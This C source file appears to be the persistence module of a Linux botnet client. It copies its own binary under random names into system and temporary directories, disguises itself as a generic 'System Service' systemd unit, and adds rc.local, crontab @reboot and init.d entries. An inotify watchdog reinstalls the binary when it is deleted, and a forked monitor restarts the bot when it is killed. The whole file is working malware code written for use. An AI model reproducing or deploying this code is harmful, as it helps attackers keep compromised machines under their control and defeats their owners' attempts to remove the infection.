#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/inotify.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>
#include <signal.h>

#include "includes.h"
#include "util.h"

#define MAX_PATH_LENGTH 256
#define MAX_CMD_LENGTH 512

static char persistent_path[256] = {0};


void persistence_watchdog_init(void);


static void generate_random_name(char *buf, int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand(time(NULL) ^ getpid());
    
    for (int i = 0; i < len - 1; i++) {
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buf[len - 1] = '\0';
}


static BOOL is_readonly(const char *path) {
    struct statvfs fs;
    if (statvfs(path, &fs) != 0) {
        return TRUE; 
    }
    return (fs.f_flag & ST_RDONLY) != 0;
}


static BOOL is_tmpfs(const char *path) {
    FILE *mtab = fopen("/proc/mounts", "r");
    if (mtab == NULL) {
        
        
        return FALSE;
    }
    
    char line[512];
    char mount_point[256];
    char fs_type[64];
    BOOL is_tmp = FALSE;
    
    
    char real_path[256];
    if (realpath(path, real_path) == NULL) {
        strncpy(real_path, path, sizeof(real_path) - 1);
        real_path[sizeof(real_path) - 1] = '\0';
    }
    
    
    while (fgets(line, sizeof(line), mtab) != NULL) {
        
        if (sscanf(line, "%*s %255s %63s", mount_point, fs_type) == 2) {
            if (strcmp(fs_type, "tmpfs") == 0 || strcmp(fs_type, "ramfs") == 0) {
                
                size_t mount_len = strlen(mount_point);
                if (strncmp(real_path, mount_point, mount_len) == 0) {
                    
                    if (real_path[mount_len] == '\0' || real_path[mount_len] == '/') {
                        is_tmp = TRUE;
                        break;
                    }
                }
            }
        }
    }
    
    fclose(mtab);
    return is_tmp;
}


static long long get_available_space(const char *path) {
    struct statvfs fs;
    if (statvfs(path, &fs) != 0) {
        return 0;
    }
    return (long long)fs.f_bavail * (long long)fs.f_frsize;
}


static long long get_file_size(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) {
        return 0;
    }
    return st.st_size;
}


static BOOL copy_file(const char *src, const char *dst) {
    FILE *src_fd, *dst_fd;
    char buffer[4096];
    size_t bytes_read;
    long long src_size, available_space;
    
    
    src_size = get_file_size(src);
    if (src_size == 0) {
        return FALSE;
    }
    
    
    
    available_space = get_available_space(dst);
    long long min_free_space = 1024 * 1024; 
    if (available_space < src_size * 2 || available_space < min_free_space) {
        return FALSE; 
    }
    
    src_fd = fopen(src, "rb");
    if (src_fd == NULL) {
        return FALSE;
    }
    
    dst_fd = fopen(dst, "wb");
    if (dst_fd == NULL) {
        fclose(src_fd);
        return FALSE;
    }
    
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), src_fd)) > 0) {
        if (fwrite(buffer, 1, bytes_read, dst_fd) != bytes_read) {
            fclose(src_fd);
            fclose(dst_fd);
            unlink(dst);
            return FALSE;
        }
    }
    
    fclose(src_fd);
    fclose(dst_fd);
    
    
    if (get_file_size(dst) != src_size) {
        unlink(dst);
        return FALSE;
    }
    
    
    chmod(dst, 0755);
    
    return TRUE;
}


static BOOL setup_rclocal(const char *bot_path) {
    char rclocal_path[] = "/etc/rc.local";
    FILE *f;
    char line[512];
    BOOL found = FALSE;
    
    
    if (is_readonly("/etc")) {
        return FALSE;
    }
    
    
    f = fopen(rclocal_path, "r");
    if (f != NULL) {
        while (fgets(line, sizeof(line), f) != NULL) {
            if (strstr(line, bot_path) != NULL) {
                found = TRUE;
                break;
            }
        }
        fclose(f);
    }
    
    if (found) {
        return TRUE;
    }
    
    
    f = fopen(rclocal_path, "a");
    if (f == NULL) {
        return FALSE;
    }
    
    
    fprintf(f, "\n# Auto-added service\n");
    fprintf(f, "%s &\n", bot_path);
    fclose(f);
    
    return TRUE;
}


static BOOL setup_systemd(const char *bot_path) {
    char service_name[64];
    char service_path[128];
    FILE *f;
    
    
    if (is_readonly("/etc")) {
        return FALSE;
    }
    
    
    if (access("/etc/systemd/system", F_OK) != 0) {
        return FALSE;
    }
    
    
    if (access("/etc/systemd/system", W_OK) != 0) {
        return FALSE;
    }
    
    generate_random_name(service_name, 12);
    snprintf(service_path, sizeof(service_path), "/etc/systemd/system/%s.service", service_name);
    
    f = fopen(service_path, "w");
    if (f == NULL) {
        return FALSE;
    }
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=System Service\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=simple\n");
    fprintf(f, "ExecStart=%s\n", bot_path);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=10\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    
    fclose(f);
    
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "systemctl enable %s.service >/dev/null 2>&1 || true", service_name);
    system(cmd);
    
    return TRUE;
}


static BOOL setup_cron(const char *bot_path) {
    char cron_cmd[512];
    FILE *f;
    char line[512];
    BOOL found = FALSE;
    
    
    f = popen("crontab -l 2>/dev/null", "r");
    if (f != NULL) {
        while (fgets(line, sizeof(line), f) != NULL) {
            if (strstr(line, bot_path) != NULL) {
                found = TRUE;
                break;
            }
        }
        pclose(f);
    }
    
    if (found) {
        return TRUE;
    }
    
    
    snprintf(cron_cmd, sizeof(cron_cmd), "(crontab -l 2>/dev/null; echo '@reboot %s &') | crontab -", bot_path);
    if (system(cron_cmd) != 0) {
        return FALSE;
    }
    
    return TRUE;
}


const char* get_persistent_path(void) {
    if (persistent_path[0] != '\0') {
        return persistent_path;
    }
    return NULL;
}



void persistence_init(void) {
    char self_exe[4096];
    char install_path[256];
    ssize_t len;
    
    
    len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len == -1) {
        return;
    }
    self_exe[len] = '\0';
    
    
    if (strstr(self_exe, "/usr/bin/") != NULL ||
        strstr(self_exe, "/usr/sbin/") != NULL ||
        strstr(self_exe, "/lib/") != NULL ||
        strstr(self_exe, "/usr/lib/") != NULL ||
        strstr(self_exe, "/usr/local/") != NULL ||
        strstr(self_exe, "/opt/") != NULL) {
        
        util_strcpy(persistent_path, self_exe);
        return;
    }
    
    
    
    const char *install_dirs[] = {
        "/usr/local/bin",      
        "/usr/local/lib",      
        "/opt",                
        "/var/lib",            
        "/usr/bin",            
        "/usr/sbin",           
        "/lib",                
        "/usr/lib"             
    };
    
    BOOL installed = FALSE;
    for (int i = 0; i < sizeof(install_dirs) / sizeof(install_dirs[0]); i++) {
        
        if (access(install_dirs[i], F_OK) != 0) {
            continue;
        }
        
        
        if (is_readonly(install_dirs[i])) {
            continue;
        }
        
        
        if (is_tmpfs(install_dirs[i])) {
            continue;
        }
        
        
        if (access(install_dirs[i], W_OK) == 0) {
            char random_name[32];
            generate_random_name(random_name, 16);
            
            snprintf(install_path, sizeof(install_path), "%s/%s", install_dirs[i], random_name);
            
            
            if (copy_file(self_exe, install_path)) {
                
                if (access(install_path, X_OK) == 0) {
                    util_strcpy(persistent_path, install_path);
                    installed = TRUE;
                    break;
                }
            }
        }
    }
    
    if (!installed) {
        
        
        const char *fallback_dirs[] = {
            "/tmp",
            "/var/tmp",
            "/dev/shm"
        };
        
        for (int i = 0; i < sizeof(fallback_dirs) / sizeof(fallback_dirs[0]); i++) {
            if (access(fallback_dirs[i], W_OK) == 0) {
                char random_name[32];
                generate_random_name(random_name, 16);
                snprintf(install_path, sizeof(install_path), "%s/%s", fallback_dirs[i], random_name);
                
                if (copy_file(self_exe, install_path)) {
                    if (access(install_path, X_OK) == 0) {
                        util_strcpy(persistent_path, install_path);
                        installed = TRUE;
                        break;
                    }
                }
            }
        }
        
        if (!installed) {
            
            
            return;
        }
    }
    
    
    
    setup_systemd(install_path);
    setup_rclocal(install_path);
    setup_cron(install_path);
    
    
    persistence_watchdog_init();
    
    
    if (access("/etc/init.d", F_OK) == 0 && access("/etc/init.d", W_OK) == 0 && !is_readonly("/etc")) {
        char init_script[256];
        char random_name[32];
        generate_random_name(random_name, 12);
        
        snprintf(init_script, sizeof(init_script), "/etc/init.d/%s", random_name);
        
        FILE *f = fopen(init_script, "w");
        if (f != NULL) {
            fprintf(f, "#!/bin/sh\n");
            fprintf(f, "### BEGIN INIT INFO\n");
            fprintf(f, "# Provides:          %s\n", random_name);
            fprintf(f, "# Required-Start:    $network\n");
            fprintf(f, "# Default-Start:     2 3 4 5\n");
            fprintf(f, "# Default-Stop:\n");
            fprintf(f, "### END INIT INFO\n\n");
            fprintf(f, "%s &\n", install_path);
            fclose(f);
            chmod(init_script, 0755);
        }
    }
}


static int inotify_fd = -1;
static int inotify_wd = -1;

void persistence_watchdog_init(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
    
    
    
    inotify_fd = inotify_init();
    if (inotify_fd == -1)
        return;
    
    
    int flags = fcntl(inotify_fd, F_GETFL);
    if (flags != -1) {
        fcntl(inotify_fd, F_SETFL, flags | O_NONBLOCK);
    }
    
    
    char dir_path[256];
    strncpy(dir_path, persistent, sizeof(dir_path) - 1);
    dir_path[sizeof(dir_path) - 1] = '\0';
    
    
    char *last_slash = strrchr(dir_path, '/');
    if (last_slash != NULL) {
        *last_slash = '\0';
    } else {
        strcpy(dir_path, ".");
    }
    
    inotify_wd = inotify_add_watch(inotify_fd, dir_path, IN_DELETE | IN_MOVED_FROM);
    if (inotify_wd == -1) {
        close(inotify_fd);
        inotify_fd = -1;
    }
}


void persistence_check_health(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
    
    
    if (access(persistent, F_OK) != 0) {
        
        #ifndef DEBUG
        persistence_init();
        #endif
        return;
    }
    
    
    if (inotify_fd != -1) {
        char buf[4096];
        ssize_t len = read(inotify_fd, buf, sizeof(buf));
        if (len > 0) {
            
            #ifndef DEBUG
            persistence_init();
            #endif
        }
    }
}


static pid_t watchdog_pid = -1;

static void watchdog_monitor(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
    
    pid_t monitor_pid = fork();
    if (monitor_pid < 0)
        return;
    
    if (monitor_pid > 0) {
        
        watchdog_pid = monitor_pid;
        return;
    }
    
    
    
    setsid();
    
    pid_t bot_pid = getppid();
    
    
    for (int i = 0; i < 1024; i++) {
        close(i);
    }
    
    while (1) {
        sleep(60); 
        
        
        if (kill(bot_pid, 0) != 0) {
            
            if (access(persistent, X_OK) == 0) {
                pid_t new_bot = fork();
                if (new_bot == 0) {
                    
                    char *argv[] = {(char *)persistent, NULL};
                    execv(persistent, argv);
                    _exit(1);
                } else if (new_bot > 0) {
                    
                    bot_pid = new_bot;
                }
            } else {
                
                _exit(0);
            }
        }
    }
}


void persistence_watchdog_start(void) {
    #ifndef DEBUG
    watchdog_monitor();
    #endif
}

